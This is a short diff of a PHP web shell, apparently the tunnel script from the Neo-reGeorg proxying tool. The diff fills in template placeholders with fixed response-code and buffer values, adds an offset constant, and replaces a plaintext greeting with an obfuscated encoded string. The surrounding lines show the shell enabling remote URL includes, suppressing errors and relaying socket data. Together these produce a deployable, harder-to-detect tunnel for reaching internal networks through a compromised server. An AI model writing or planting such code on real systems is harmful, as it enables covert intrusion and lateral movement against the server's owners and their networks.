@@ -5,8 +5,10 @@ ini_set("allow_url_include", true);
 ini_set('always_populate_raw_post_data', -1);
 error_reporting(E_ERROR | E_PARSE);
 
+define('BLV_L_OFFSET', 5);
+
 // HTTP response code Handling : send arbitrary code as response
-if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
+if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);
 
 // decode binary to string
 function blv_decode($data) {
@@ -133,7 +135,7 @@ switch($cmd){
                     }
                 }
                 stream_set_blocking($res, false);
-                while ($o = fgets($res, READBUF)) {
+                while ($o = fgets($res, 513)) {
                     if($o === false)
                     {
                         @session_start();
@@ -142,7 +144,7 @@ switch($cmd){
                         return;
                     }
                     $readBuff .= $o;
-                    if ( strlen($readBuff) > MAXREADSIZE ) {
+                    if ( strlen($readBuff) > 524288) {
                         break;
                     }
                 }
@@ -211,7 +213,8 @@ switch($cmd){
     }
 }
 if ( $sayhello ) {
-    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
+    echo base64_decode(strtr("VrlEFMb0McIu2PxMMHdcBHut2DBg2lg/7dwl7DIdg9ns7f+
+BuHzv1L+t2cIlB9yJqfwfgZBh16uPCd8vq9zMqmxttDB0yrdEV5==", $de, $en));
 } else {
     echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
